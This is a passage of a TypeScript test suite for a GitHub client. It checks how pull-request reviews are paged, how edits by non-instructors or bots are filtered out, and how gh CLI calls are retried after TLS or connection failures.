        const error = yield* errorWith(setup(reply(feedbackReply([], [comment]))));
        assert.strictEqual(error._tag, "GitHubParse", JSON.stringify(comment));
      }
      const noReviewId = {
        ...reviewNode(11, "COMMENTED", "x", "2026-10-04T11:00:00Z", "rawphp"),
        fullDatabaseId: null,
      };
      const reviewError = yield* errorWith(setup(reply(feedbackReply([noReviewId], []))));
      assert.strictEqual(reviewError._tag, "GitHubParse");
      for (const garbage of ["", "no", "{}"]) {
        const error = yield* errorWith(setup(reply(garbage)));
        assert.strictEqual(error._tag, "GitHubParse", garbage);
      }
    }),
  );

  /** 50 reviews by a stranger at 11:00 to 11:49 on the day of `FB_SINCE`; the first at 09:00 with `olderFirst`. */
  const fiftyReviews = (olderFirst: boolean): Array<Json> =>
    Array.from({ length: 50 }, (_, i) =>
      reviewNode(
        100 + i,
        "COMMENTED",
        "noise",
        olderFirst && i === 0 ? "2026-10-04T09:00:00Z" : `2026-10-04T11:${pad(i)}:00Z`,
        "stranger",
      ),
    );
  const oldestIsInstructors = (id: number, body: string, at: string) =>
    reviewNode(id, "CHANGES_REQUESTED", body, at, "rawphp");

  it.effect("the oldest of the fifty reviews the query reads is still read", () =>
    Effect.gen(function* () {
      // GitHub lists the newest 50 oldest first: the instructor's review is the first of a full
      // page. With no `totalCount` saying more exist, nothing pages back.
      const reviews = [
        oldestIsInstructors(11, "the oldest", "2026-10-04T11:00:00Z"),
        ...fiftyReviews(false).slice(1),
      ];
      assert.strictEqual(reviews.length, 50);
      const t = setup(reply(feedbackReply(reviews, [])));
      assert.deepStrictEqual(feedbackIds(yield* readWith(t)), ["review:11"]);
      assert.strictEqual(t.calls().length, 1);
    }),
  );

  it.effect("a full page of new reviews with more behind it is paged back to read the 51st", () =>
    Effect.gen(function* () {
      const older = oldestIsInstructors(11, "the 51st", "2026-10-04T10:45:00Z");
      const t = setup(
        reply(pagedReply(fiftyReviews(false), [], 51, "c1")),
        reply(reviewsPage([older], 51, "c0")),
      );
      assert.deepStrictEqual(feedbackIds(yield* readWith(t)), ["review:11"]);
      assert.deepStrictEqual(t.calls(), [feedbackCall(PR_FEEDBACK_QUERY), beforeCall("c1")]);
    }),
  );

  it.effect("a pending oldest review does not stop the paging", () =>
    Effect.gen(function* () {
      const [first, ...rest] = fiftyReviews(false);
      const pending = [{ ...first, submittedAt: null }, ...rest];
      const older = oldestIsInstructors(11, "the 51st", "2026-10-04T10:45:00Z");
      const t = setup(
        reply(pagedReply(pending, [], 51, "c1")),
        reply(reviewsPage([older], 51, "c0")),
      );
      assert.deepStrictEqual(feedbackIds(yield* readWith(t)), ["review:11"]);
      assert.deepStrictEqual(t.calls(), [feedbackCall(PR_FEEDBACK_QUERY), beforeCall("c1")]);
    }),
  );

  it.effect("an unreadable time on the oldest review is an error and pages no further", () =>
    Effect.gen(function* () {
      const [first, ...rest] = fiftyReviews(false);
      const garbled = [{ ...first, submittedAt: "yesterday" }, ...rest];
      const t = setup(reply(pagedReply(garbled, [], 51, "c1")));
      const error = yield* errorWith(t);
      assert.strictEqual(error._tag, "GitHubParse");
      assert.strictEqual(t.calls().length, 1);
    }),
  );

  it.effect("paging back stops at a review at or before the starting point", () =>
    Effect.gen(function* () {
      const page = [
        reviewNode(10, "COMMENTED", "old", "2026-10-04T10:30:00Z", "rawphp"),
        oldestIsInstructors(11, "new", "2026-10-04T10:45:00Z"),
      ];
      const t = setup(
        reply(pagedReply(fiftyReviews(false), [], 200, "c1")),
        reply(reviewsPage(page, 200, "c0")),
      );
      assert.deepStrictEqual(feedbackIds(yield* readWith(t)), ["review:11"]);
      assert.strictEqual(t.calls().length, 2);
    }),
  );

  it.effect("paging back goes on while the oldest review read is still new", () =>
    Effect.gen(function* () {
      const pageOfNew = (base: number) =>
        [0, 1].map((i) =>
          reviewNode(base + i, "COMMENTED", "noise", "2026-10-04T10:40:00Z", "stranger"),
        );
      const oldest = reviewNode(1, "COMMENTED", "old", "2026-10-04T09:00:00Z", "stranger");
      const t = setup(
        reply(pagedReply(fiftyReviews(false), [], 54, "c1")),
        reply(reviewsPage(pageOfNew(60), 54, "c0")),
        reply(reviewsPage([oldest, ...pageOfNew(70)], 54, "cx")),
      );
      yield* readWith(t);
      assert.deepStrictEqual(t.calls(), [
        feedbackCall(PR_FEEDBACK_QUERY),
        beforeCall("c1"),
        beforeCall("c0"),
      ]);
    }),
  );

  it.effect("a failed call for the earlier reviews is an error and is not retried", () =>
    Effect.gen(function* () {
      const t = setup(reply(pagedReply(fiftyReviews(false), [], 51, "c1")), fail(1, "boom"));
      const error = yield* errorWith(t);
      assert.strictEqual(error._tag, "GitHubFailed");
      assert.strictEqual(t.calls().length, 2);
    }),
  );

  it.effect("reviews from every page come back oldest first", () =>
    Effect.gen(function* () {
      const newer = reviewNode(30, "COMMENTED", "newer", "2026-10-04T11:20:00Z", "rawphp");
      const olderPage = [
        reviewNode(10, "COMMENTED", "old", "2026-10-04T10:30:00Z", "rawphp"),
        reviewNode(20, "COMMENTED", "older", "2026-10-04T10:45:00Z", "rawphp"),
      ];
      const t = setup(
        reply(pagedReply([newer, ...fiftyReviews(false)], [], 100, "c1")),
        reply(reviewsPage(olderPage, 100, "c0")),
      );
      assert.deepStrictEqual(feedbackIds(yield* readWith(t)), ["review:20", "review:30"]);
      assert.strictEqual(t.calls().length, 2);
    }),
  );

  /**
   * Replies to the feedback query and to `pages - 1` paging calls, every page one new review by a
   * stranger and a total no number of pages reaches, each with a cursor of its own. With `oldLast`
   * the last page is at or before the starting point.
   */
  const endlessReviews = (pages: number, oldLast: boolean): Array<Answer> => {
    const answers = [reply(pagedReply(fiftyReviews(false), [], 1_000_000, "c1"))];
    for (let i = 1; i < pages; i += 1) {
      const at = oldLast && i === pages - 1 ? "2026-10-04T09:00:00Z" : "2026-10-04T10:40:00Z";
      const review = reviewNode(1000 + i, "COMMENTED", "noise", at, "stranger");
      answers.push(reply(reviewsPage([review], 1_000_000, `c${i + 1}`)));
    }
    return answers;
  };

  it.effect("a page with the cursor that was just sent is an error after two calls", () =>
    Effect.gen(function* () {
      const page = reviewNode(11, "COMMENTED", "noise", "2026-10-04T10:40:00Z", "stranger");
      const t = setup(
        reply(pagedReply(fiftyReviews(false), [], 1000, "c1")),
        reply(reviewsPage([page], 1000, "c1")),
        reply(reviewsPage([page], 1000, "c1")),
      );
      const error = yield* errorWith(t);
      assert.strictEqual(error._tag, "GitHubParse");
      assert.strictEqual(t.calls().length, 2);
    }),
  );

  it.effect("paging back that would read past the page limit is an error after the limit", () =>
    Effect.gen(function* () {
      const t = setup(...endlessReviews(REVIEW_PAGE_LIMIT + 5, false));
      const error = yield* errorWith(t);
      assert.strictEqual(error._tag, "GitHubParse");
      assert.strictEqual(t.calls().length, REVIEW_PAGE_LIMIT);
    }),
  );

  it.effect("paging back that reaches an old review on the last page allowed is not an error", () =>
    Effect.gen(function* () {
      const t = setup(...endlessReviews(REVIEW_PAGE_LIMIT, true));
      yield* readWith(t);
      assert.strictEqual(t.calls().length, REVIEW_PAGE_LIMIT);
    }),
  );

  it.effect("a total equal to the reviews read does not page back", () =>
    Effect.gen(function* () {
      const t = setup(reply(pagedReply(fiftyReviews(false), [], 50, "c1")));
      yield* readWith(t);
      assert.strictEqual(t.calls().length, 1);
    }),
  );

  it.effect(
    "a full page whose oldest review is at or before the starting point does not page back",
    () =>
      Effect.gen(function* () {
        const t = setup(reply(pagedReply(fiftyReviews(true), [], 51, "c1")));
        yield* readWith(t);
        assert.strictEqual(t.calls().length, 1);
      }),
  );

  it.effect("paging back stops at the floor and still judges what is after since", () =>
    Effect.gen(function* () {
      const older = oldestIsInstructors(
        11,
        "after since, before the floor",
        "2026-10-04T10:45:00Z",
      );
      const t = setup(
        reply(pagedReply(fiftyReviews(false), [], 1000, "c1")),
        reply(reviewsPage([older], 1000, "c0")),
      );
      const got = yield* readWith(t, FB_SINCE, "2026-10-04T10:50:00Z");
      assert.deepStrictEqual(feedbackIds(got), ["review:11"]);
      assert.deepStrictEqual(t.calls(), [feedbackCall(PR_FEEDBACK_QUERY), beforeCall("c1")]);
    }),
  );

  it.effect(
    "a full page whose oldest review is at the floor does not page back and is judged",
    () =>
      Effect.gen(function* () {
        const page = [
          oldestIsInstructors(11, "at the floor", "2026-10-04T11:00:00Z"),
          reviewNode(12, "COMMENTED", "noise", "2026-10-04T11:05:00Z", "stranger"),
        ];
        const t = setup(reply(pagedReply(page, [], 1000, "c1")));
        const got = yield* readWith(t, FB_SINCE, "2026-10-04T11:00:00Z");
        assert.deepStrictEqual(feedbackIds(got), ["review:11"]);
        assert.strictEqual(t.calls().length, 1);
      }),
  );

  it.effect(
    "paging back ends on an empty page and fails on a gone pull request or a missing cursor",
    () =>
      Effect.gen(function* () {
        const first = pagedReply(fiftyReviews(false), [], 99, "c1");
        // GitHub answers `before:` the oldest cursor with an empty page: the start was reached.
        const empty = setup(reply(first), reply(reviewsPage([], 99, "c0")));
        yield* readWith(empty);
        assert.strictEqual(empty.calls().length, 2);

        const gone = setup(reply(first), reply(GONE));
        assert.strictEqual((yield* errorWith(gone))._tag, "GitHubParse");
        assert.strictEqual(gone.calls().length, 2);

        const noCursor = setup(
          reply(
            JSON.stringify({
              data: {
                repository: {
                  pullRequest: {
                    reviews: { totalCount: 99, nodes: fiftyReviews(false) },
                    comments: { nodes: [] },
                  },
                },
              },
            }),
          ),
        );
        assert.strictEqual((yield* errorWith(noCursor))._tag, "GitHubParse");
        assert.strictEqual(noCursor.calls().length, 1);
      }),
  );

  const EDITED_AT = "2026-10-04T11:05:00Z";
  const editHistory = (total: number, shown: ReadonlyArray<readonly [string, string]>): Json => ({
    totalCount: total,
    nodes: shown.map(([editedAt, who]) => ({ editedAt, editor: person(who) })),
  });
  const BY_INSTRUCTOR_ONLY = [
    [EDITED_AT, "rawphp"],
    ["2026-10-04T11:00:00Z", "rawphp"],
  ] as const;
  const STRANGER_THEN_INSTRUCTOR = [
    [EDITED_AT, "rawphp"],
    ["2026-10-04T11:03:00Z", "stranger"],
    ["2026-10-04T11:00:00Z", "rawphp"],
  ] as const;
  const BY_STRANGER = [
    [EDITED_AT, "stranger"],
    ["2026-10-04T11:00:00Z", "rawphp"],
  ] as const;

  /** A conversation comment by `rawphp`, last edited at 11:05 by `lastEditor`, with `history` as its edits. */
  const editedPrComment = (id: number, lastEditor: string, history: Json): Json => ({
    ...prCommentNode(id, "text", "2026-10-04T11:00:00Z", "rawphp"),
    lastEditedAt: EDITED_AT,
    editor: person(lastEditor),
    userContentEdits: history,
  });
  /** A review by `rawphp`, last edited at 11:05 by `lastEditor`, with `history` as its edits. */
  const editedReview = (
    id: number,
    lastEditor: string,
    history: Json,
    inline: ReadonlyArray<Json> = [],
  ): Json => ({
    ...reviewNode(id, "COMMENTED", "text", "2026-10-04T11:00:00Z", "rawphp", inline),
    lastEditedAt: EDITED_AT,
    editor: person(lastEditor),
    userContentEdits: history,
  });
  /** An inline comment by `rawphp` with node id `id`, edited at 11:05. Its history is read on its own. */
  const editedInline = (body: string, id: string | null): Json => ({
    ...(id === null ? {} : { id }),
    body,
    path: "src/a.rs",
    line: 7,
    originalLine: 7,
    author: person("rawphp"),
    lastEditedAt: EDITED_AT,
  });
  /** One node of GitHub's answer to the edit-history query. */
  const editNode = (id: string, lastEditor: string, history: Json): Json => ({
    id,
    lastEditedAt: EDITED_AT,
    editor: person(lastEditor),
    userContentEdits: history,
  });
  const editNodesReply = (nodes: ReadonlyArray<unknown>) => JSON.stringify({ data: { nodes } });
  const reviewWith = (at: string, inline: ReadonlyArray<Json>) =>
    reviewNode(11, "CHANGES_REQUESTED", "please fix", at, "rawphp", inline);

  it.effect("an item edited by someone who is not an instructor is not feedback", () =>
    Effect.gen(function* () {
      const byStranger = editedPrComment(21, "stranger", editHistory(2, BY_STRANGER));
      const byInstructor = editedPrComment(22, "rawphp", editHistory(2, BY_INSTRUCTOR_ONLY));
      const byNobody = {
        ...prCommentNode(23, "changed", "2026-10-04T11:02:00Z", "rawphp"),
        lastEditedAt: EDITED_AT,
        editor: null,
        userContentEdits: { totalCount: 1, nodes: [] },
      };
      const byBot = {
        ...editedReview(11, "rawphp", editHistory(2, BY_INSTRUCTOR_ONLY)),
        editor: { __typename: "Bot", login: "rawphp" },
      };
      const got = yield* readFeedback(feedbackReply([byBot], [byStranger, byInstructor, byNobody]));
      assert.deepStrictEqual(feedbackIds(got), ["pr-comment:22"]);
    }),
  );

  it.effect("a stranger's edit followed by an instructor's touch-up is not feedback", () =>
    Effect.gen(function* () {
      const history = editHistory(3, STRANGER_THEN_INSTRUCTOR);
      const got = yield* readFeedback(
        feedbackReply(
          [editedReview(11, "rawphp", history)],
          [editedPrComment(21, "rawphp", history)],
        ),
      );
      assert.deepStrictEqual(got, []);
    }),
  );

  it.effect("an item whose edits were all an instructor's is feedback", () =>
    Effect.gen(function* () {
      const history = editHistory(2, BY_INSTRUCTOR_ONLY);
      const got = yield* readFeedback(
        feedbackReply(
          [editedReview(11, "rawphp", history)],
          [editedPrComment(21, "rawphp", history)],
        ),
      );
      assert.deepStrictEqual(feedbackIds(got), ["review:11", "pr-comment:21"]);
    }),
  );

  it.effect("an edit history that is cut off or lacks the latest edit is not feedback", () =>
    Effect.gen(function* () {
      // Three edits, two shown: an older one may be a stranger's.
      const cutOff = editHistory(3, BY_INSTRUCTOR_ONLY);
      // Edited, and no history at all.
      const { userContentEdits: _history, ...missing } = editedPrComment(
        22,
        "rawphp",
        editHistory(2, BY_INSTRUCTOR_ONLY),
      );
      // The newest entry is not the latest edit.
      const stale = editHistory(1, [["2026-10-04T11:00:00Z", "rawphp"]]);
      const got = yield* readFeedback(
        feedbackReply(
          [editedReview(11, "rawphp", cutOff)],
          [editedPrComment(21, "rawphp", cutOff), missing, editedPrComment(23, "rawphp", stale)],
        ),
      );
      assert.deepStrictEqual(got, []);
    }),
  );

  it.effect(
    "an inline comment edited by a stranger is dropped and the rest of the review stays",
    () =>
      Effect.gen(function* () {
        const inline = [
          inlineNode("untouched", "src/a.rs", 7, "rawphp"),
          editedInline("by stranger", "C1"),
          editedInline("stranger then touch-up", "C2"),
          editedInline("own touch-up", "C3"),
        ];
        const t = setup(
          reply(feedbackReply([reviewWith("2026-10-04T11:00:00Z", inline)], [])),
          reply(
            editNodesReply([
              editNode("C1", "stranger", editHistory(2, BY_STRANGER)),
              editNode("C2", "rawphp", editHistory(3, STRANGER_THEN_INSTRUCTOR)),
              editNode("C3", "rawphp", editHistory(2, BY_INSTRUCTOR_ONLY)),
            ]),
          ),
        );
        const got = yield* readWith(t);
        assert.strictEqual(got.length, 1);
        assert.strictEqual(got[0]?.body, "please fix");
        assert.deepStrictEqual(
          got[0]?.inline.map((c) => c.body),
          ["untouched", "own touch-up"],
        );
        assert.deepStrictEqual(t.calls(), [
          feedbackCall(PR_FEEDBACK_QUERY),
          editorCall("C1", "C2", "C3"),
        ]);
      }),
  );

  it.effect("an unedited inline comment costs no second call", () =>
    Effect.gen(function* () {
      const inline = [inlineNode("plain", "src/a.rs", 7, "rawphp")];
      const t = setup(reply(feedbackReply([reviewWith("2026-10-04T11:00:00Z", inline)], [])));
      const got = yield* readWith(t);
      assert.strictEqual(got[0]?.inline.length, 1);
      assert.strictEqual(t.calls().length, 1);
    }),
  );

  it.effect("an edited inline comment whose whole history is an instructor's is kept", () =>
    Effect.gen(function* () {
      const inline = [editedInline("touched up", "PRRC_abc")];
      const t = setup(
        reply(feedbackReply([reviewWith("2026-10-04T11:00:00Z", inline)], [])),
        reply(editNodesReply([editNode("PRRC_abc", "rawphp", editHistory(2, BY_INSTRUCTOR_ONLY))])),
      );
      const got = yield* readWith(t);
      assert.strictEqual(got[0]?.inline[0]?.body, "touched up");
      assert.deepStrictEqual(t.calls(), [feedbackCall(PR_FEEDBACK_QUERY), editorCall("PRRC_abc")]);
    }),
  );

  /** Reads one review whose one inline comment `PRRC_abc` was edited, with this answer to the history query. */
  const inlineKeptGiven = (answer: string) =>
    Effect.gen(function* () {
      const inline = [editedInline("touched up", "PRRC_abc")];
      const t = setup(
        reply(feedbackReply([reviewWith("2026-10-04T11:00:00Z", inline)], [])),
        reply(answer),
      );
      const got = yield* readWith(t);
      assert.strictEqual(got.length, 1, "the review stays");
      return got[0]?.inline.map((c) => c.body) ?? [];
    });

  it.effect("an edited inline comment with a cut-off history is dropped and the review stays", () =>
    Effect.gen(function* () {
      const answer = editNodesReply([
        editNode("PRRC_abc", "rawphp", editHistory(3, BY_INSTRUCTOR_ONLY)),
      ]);
      assert.deepStrictEqual(yield* inlineKeptGiven(answer), []);
    }),
  );

  it.effect(
    "an edited inline comment with a full page of edits is dropped and the review stays",
    () =>
      Effect.gen(function* () {
        // A hundred entries, all the instructor's, and the total says no more: a full page may
        // still hide older ones.
        const history = editHistory(
          100,
          Array.from({ length: 100 }, () => [EDITED_AT, "rawphp"] as const),
        );
        const answer = editNodesReply([editNode("PRRC_abc", "rawphp", history)]);
        assert.deepStrictEqual(yield* inlineKeptGiven(answer), []);
      }),
  );

  it.effect("an edited inline comment touched by a bot with an instructor's login is dropped", () =>
    Effect.gen(function* () {
      const bot = { __typename: "Bot", login: "rawphp" };
      const rawphp = person("rawphp");
      const history = (first: Json, second: Json): Json => ({
        totalCount: 2,
        nodes: [
          { editedAt: EDITED_AT, editor: first },
          { editedAt: "2026-10-04T11:00:00Z", editor: second },
        ],
      });
      const lastEditorIsABot = {
        id: "PRRC_abc",
        lastEditedAt: EDITED_AT,
        editor: bot,
        userContentEdits: history(bot, rawphp),
      };
      assert.deepStrictEqual(yield* inlineKeptGiven(editNodesReply([lastEditorIsABot])), []);
      // The bot is one of the earlier edits.
      const botInTheHistory = {
        id: "PRRC_abc",
        lastEditedAt: EDITED_AT,
        editor: rawphp,
        userContentEdits: history(rawphp, bot),
      };
      assert.deepStrictEqual(yield* inlineKeptGiven(editNodesReply([botInTheHistory])), []);
    }),
  );

  it.effect(
    "a bot as the last editor is dropped though the newest entry is a user of the same login",
    () =>
      Effect.gen(function* () {
        // The history agrees with the editor by login, but the last editor is not a person.
        const node = {
          id: "PRRC_abc",
          lastEditedAt: EDITED_AT,
          editor: { __typename: "Bot", login: "rawphp" },
          userContentEdits: editHistory(2, BY_INSTRUCTOR_ONLY),
        };
        assert.deepStrictEqual(yield* inlineKeptGiven(editNodesReply([node])), []);
      }),
  );

  it.effect(
    "an edited inline comment that is gone or has no id is dropped and the review stays",
    () =>
      Effect.gen(function* () {
        const inline = [editedInline("gone", "PRRC_gone"), editedInline("no id", null)];
        const t = setup(
          reply(feedbackReply([reviewWith("2026-10-04T11:00:00Z", inline)], [])),
          reply(editNodesReply([null])),
        );
        const got = yield* readWith(t);
        assert.strictEqual(got.length, 1);
        assert.deepStrictEqual(got[0]?.inline, []);
        // Only the one with an id was looked up.
        assert.deepStrictEqual(t.calls(), [
          feedbackCall(PR_FEEDBACK_QUERY),
          editorCall("PRRC_gone"),
        ]);
      }),
  );

  const editedInlineList = (from: number, n: number): Array<Json> =>
    Array.from({ length: n }, (_, k) => editedInline(`note ${from + k}`, `E${from + k}`));
  const wholeHistoryNode = (i: number): Json =>
    editNode(`E${i}`, "rawphp", editHistory(2, BY_INSTRUCTOR_ONLY));

  it.effect("the edited inline comments of every review are read with one extra call", () =>
    Effect.gen(function* () {
      const reviews = [
        reviewNode(
          11,
          "COMMENTED",
          "one",
          "2026-10-04T11:00:00Z",
          "rawphp",
          editedInlineList(0, 3),
        ),
        reviewNode(
          12,
          "COMMENTED",
          "two",
          "2026-10-04T11:01:00Z",
          "rawphp",
          editedInlineList(3, 2),
        ),
      ];
      const nodes = Array.from({ length: 5 }, (_, i) => wholeHistoryNode(i));
      // E1's last editor is a stranger.
      nodes[1] = editNode("E1", "stranger", editHistory(2, BY_STRANGER));
      // The answer comes in any order: it is matched by id, not by position.
      const t = setup(reply(feedbackReply(reviews, [])), reply(editNodesReply(nodes.toReversed())));
      const got = yield* readWith(t);
      assert.strictEqual(got.length, 2);
      assert.deepStrictEqual(
        got[0]?.inline.map((c) => c.body),
        ["note 0", "note 2"],
      );
      assert.deepStrictEqual(
        got[1]?.inline.map((c) => c.body),
        ["note 3", "note 4"],
      );
      assert.deepStrictEqual(t.calls(), [
        feedbackCall(PR_FEEDBACK_QUERY),
        editorCall("E0", "E1", "E2", "E3", "E4"),
      ]);
    }),
  );

  it.effect("a hundred and one edited inline comments are read with two extra calls", () =>
    Effect.gen(function* () {
      const review = reviewNode(
        11,
        "COMMENTED",
        "many",
        "2026-10-04T11:00:00Z",
        "rawphp",
        editedInlineList(0, 101),
      );
      const t = setup(
        reply(feedbackReply([review], [])),
        reply(editNodesReply(Array.from({ length: 100 }, (_, i) => wholeHistoryNode(i)))),
        reply(editNodesReply([wholeHistoryNode(100)])),
      );
      const got = yield* readWith(t);
      assert.strictEqual(got[0]?.inline.length, 101);
      const ids = (from: number, to: number) =>
        Array.from({ length: to - from }, (_, i) => `E${from + i}`);
      assert.deepStrictEqual(t.calls(), [
        feedbackCall(PR_FEEDBACK_QUERY),
        editorCall(...ids(0, 100)),
        editorCall(...ids(100, 101)),
      ]);
    }),
  );

  it.effect("a null entry or a missing id drops only that comment", () =>
    Effect.gen(function* () {
      const review = reviewNode(
        11,
        "COMMENTED",
        "mixed",
        "2026-10-04T11:00:00Z",
        "rawphp",
        editedInlineList(0, 4),
      );
      // E1 is null, E2 is not in the answer at all.
      const t = setup(
        reply(feedbackReply([review], [])),
        reply(editNodesReply([wholeHistoryNode(0), null, wholeHistoryNode(3)])),
      );
      const got = yield* readWith(t);
      assert.deepStrictEqual(
        got[0]?.inline.map((c) => c.body),
        ["note 0", "note 3"],
      );
    }),
  );

  it.effect("an edited inline comment of a review before since makes no extra call", () =>
    Effect.gen(function* () {
      const inline = [editedInline("old", "PRRC_old")];
      const t = setup(reply(feedbackReply([reviewWith("2026-10-04T10:00:00Z", inline)], [])));
      assert.deepStrictEqual(yield* readWith(t), []);
      assert.strictEqual(t.calls().length, 1);
    }),
  );

  it.effect("an edited inline comment by a stranger makes no extra call", () =>
    Effect.gen(function* () {
      const byStranger = { ...editedInline("theirs", "PRRC_x"), author: person("stranger") };
      const t = setup(reply(feedbackReply([reviewWith("2026-10-04T11:00:00Z", [byStranger])], [])));
      yield* readWith(t);
      assert.strictEqual(t.calls().length, 1);
    }),
  );

  it.effect("a failed or unreadable edit history read is an error", () =>
    Effect.gen(function* () {
      const main = feedbackReply(
        [reviewWith("2026-10-04T11:00:00Z", [editedInline("touched up", "PRRC_abc")])],
        [],
      );
      const failed = yield* errorWith(setup(reply(main), fail(1, "boom")));
      assert.strictEqual(failed._tag, "GitHubFailed");
      const garbled = yield* errorWith(
        setup(
          reply(main),
          reply('{"data":{"nodes":[{"id":"PRRC_abc","lastEditedAt":"2026-10-04T11:05:00Z"}]}}'),
        ),
      );
      assert.strictEqual(garbled._tag, "GitHubParse");
    }),
  );
});

describe("retrying a call GitHub never received", () => {
  const TLS =
    'Get "https://api.github.com/repos/rawphp/softfac/issues": net/http: TLS handshake timeout';
  const DIAL_TIMEOUT =
    'Post "https://api.github.com/graphql": dial tcp 140.82.112.6:443: i/o timeout';
  const REFUSED =
    'Get "https://api.github.com/x": dial tcp 140.82.112.6:443: connect: connection refused';
  const NO_HOST = 'Get "https://api.github.com/x": dial tcp: lookup api.github.com: no such host';

  it.effect("a TLS handshake timeout is retried and the second attempt's answer is returned", () =>
    Effect.gen(function* () {
      const logs: Array<{ level: string; text: string }> = [];
      const capture = Logger.make(({ logLevel, message }) => {
        const first = Array.isArray(message) ? message[0] : message;
        logs.push({ level: logLevel, text: String(first) });
      });
      const t = setup(fail(1, TLS), reply(LIST_ONE));
      const fiber = yield* Effect.forkChild(
        t
          .ok(t.github.listIssues("ready"))
          .pipe(Effect.provide(Logger.layer([capture], { mergeWithExisting: false }))),
        { startImmediately: true },
      );
      yield* TestClock.adjust("3 seconds");
      const listing = yield* Fiber.join(fiber);
      assert.strictEqual(listing.items.length, 1);
      assert.strictEqual(t.inputs.length, 2);
      assert.deepEqual(t.calls()[0], t.calls()[1]);
      // One info line names the redacted command, the attempt and the reason; nothing louder.
      assert.strictEqual(logs.length, 1);
      assert.strictEqual(logs[0]!.level, "Info");
      assert.match(
        logs[0]!.text,
        /^`gh issue list --repo rawphp\/softfac .*` attempt 1 of 5 failed \(TLS handshake timeout\); trying again in [23]\.\d s$/,
      );
    }),
  );

  it.effect("each dial failure is retried too", () =>
    Effect.gen(function* () {
      for (const stderr of [DIAL_TIMEOUT, REFUSED, NO_HOST]) {
        const t = setup(fail(1, stderr), reply(LIST_ONE));
        const fiber = yield* Effect.forkChild(t.ok(t.github.listIssues("ready")), {
          startImmediately: true,
        });
        yield* TestClock.adjust("3 seconds");
        yield* Fiber.join(fiber);
        assert.strictEqual(t.inputs.length, 2, stderr);
      }
    }),
  );

  it.effect(
    "four TLS handshake timeouts then an answer: the call succeeds after four logged retries",
    () =>
      Effect.gen(function* () {
        const logs: Array<string> = [];
        const capture = Logger.make(({ message }) => {
          logs.push(String(Array.isArray(message) ? message[0] : message));
        });
        const t = setup(fail(1, TLS), fail(1, TLS), fail(1, TLS), fail(1, TLS), reply(LIST_ONE));
        const fiber = yield* Effect.forkChild(
          t
            .ok(t.github.listIssues("ready"))
            .pipe(Effect.provide(Logger.layer([capture], { mergeWithExisting: false }))),
          { startImmediately: true },
        );
        yield* TestClock.adjust(2_000 + 5_000 + 15_000 + 30_000 + 4_000);
        const listing = yield* Fiber.join(fiber);
        assert.strictEqual(listing.items.length, 1);
        assert.strictEqual(t.inputs.length, 5);
        assert.strictEqual(logs.length, 4);
        logs.forEach((line, index) => {
          assert.match(
            line,
            new RegExp(
              `attempt ${index + 1} of 5 failed \\(TLS handshake timeout\\); trying again in \\d+\\.\\d s$`,
            ),
          );
        });
      }),
  );

  it.effect("five failed attempts return the last failure unchanged", () =>
    Effect.gen(function* () {
      const t = setup(
        fail(1, TLS),
        fail(1, DIAL_TIMEOUT),
        fail(1, TLS),
        fail(1, TLS),
        fail(1, "fifth: " + TLS),
      );
      const fiber = yield* Effect.forkChild(t.err(t.github.listIssues("ready")), {
        startImmediately: true,
      });
      yield* TestClock.adjust(2_000 + 5_000 + 15_000 + 30_000 + 4_000);
      const error = yield* Fiber.join(fiber);
      assert.strictEqual(t.inputs.length, 5);
      assert.strictEqual(error._tag, "GitHubFailed");
      if (error._tag !== "GitHubFailed") return;
      assert.strictEqual(error.status, 1);
      assert.strictEqual(error.stderr, "fifth: " + TLS);
    }),
  );

  it.effect("the retries wait 2, 5, 15 then 30 s, each plus the jitter drawn for it", () =>
    Effect.gen(function* () {
      // The wrapper draws one jitter per retry; the same seed here gives the same four draws.
      const seed = "retry-jitter";
      const draws = yield* Effect.all([
        Random.nextIntBetween(0, 1000),
        Random.nextIntBetween(0, 1000),
        Random.nextIntBetween(0, 1000),
        Random.nextIntBetween(0, 1000),
      ]).pipe(Random.withSeed(seed));
      assert.ok(
        draws.every((draw) => draw > 0),
        `draws ${draws.join(", ")}: pick another seed`,
      );
      const t = setup(fail(1, TLS), fail(1, TLS), fail(1, TLS), fail(1, TLS), reply(LIST_ONE));
      const fiber = yield* Effect.forkChild(
        t.ok(t.github.listIssues("ready")).pipe(Random.withSeed(seed)),
        { startImmediately: true },
      );
      assert.strictEqual(t.inputs.length, 1);
      const delays = [2_000, 5_000, 15_000, 30_000];
      for (const [index, delay] of delays.entries()) {
        yield* TestClock.adjust(delay + draws[index]! - 1);
        assert.strictEqual(t.inputs.length, index + 1);
        yield* TestClock.adjust(1);
        assert.strictEqual(t.inputs.length, index + 2);
      }
      yield* Fiber.join(fiber);
      for (const input of t.inputs) assert.strictEqual(input.timeoutMs, 60_000);
    }),
  );

  it.effect("a failure GitHub may have applied is not retried", () =>
    Effect.gen(function* () {
      const stderrs = [
        "HTTP 502: Bad Gateway (https://api.github.com/graphql)",
        'Get "https://api.github.com/x": read tcp 10.0.0.2:5000->140.82.112.6:443: read: connection reset by peer',
        'Get "https://api.github.com/x": read tcp 10.0.0.2:5000->140.82.112.6:443: i/o timeout',
        "HTTP 404: Not Found",
      ];
      for (const stderr of stderrs) {
        const t = setup(fail(1, stderr), reply(LIST_ONE));
        const error = yield* t.err(t.github.listIssues("ready"));
        assert.strictEqual(error._tag, "GitHubFailed", stderr);
        assert.strictEqual(t.inputs.length, 1, stderr);
      }
    }),
  );

  it.effect("a TLS timeout, then an unexpected EOF, then an answer: the read succeeds", () =>
    Effect.gen(function* () {
      const logs: Array<string> = [];
      const capture = Logger.make(({ message }) => {
        logs.push(String(Array.isArray(message) ? message[0] : message));
      });
      const t = setup(
        fail(1, 'Get "https://api.github.com/user": net/http: TLS handshake timeout'),
        fail(1, 'Get "https://api.github.com/user": unexpected EOF'),
        reply('{"login":"rawphp"}'),
      );
      const fiber = yield* Effect.forkChild(
        t
          .ok(t.github.login())
          .pipe(Effect.provide(Logger.layer([capture], { mergeWithExisting: false }))),
        { startImmediately: true },
      );
      yield* TestClock.adjust(2_000 + 5_000 + 2_000);
      assert.strictEqual(yield* Fiber.join(fiber), "rawphp");
      assert.strictEqual(t.inputs.length, 3);
      assert.match(logs[0]!, /^`gh api user` attempt 1 of 5 failed \(TLS handshake timeout\)/);
      assert.match(logs[1]!, /^`gh api user` attempt 2 of 5 failed \(unexpected EOF\)/);
    }),
  );

  it.effect("a GraphQL read's unexpected EOF is retried", () =>
    Effect.gen(function* () {
      const t = setup(
        fail(1, 'Post "https://api.github.com/graphql": unexpected EOF'),
        reply(LIST_ONE),
      );
      const fiber = yield* Effect.forkChild(t.ok(t.github.listIssues("ready")), {
        startImmediately: true,
      });
      yield* TestClock.adjust("3 seconds");
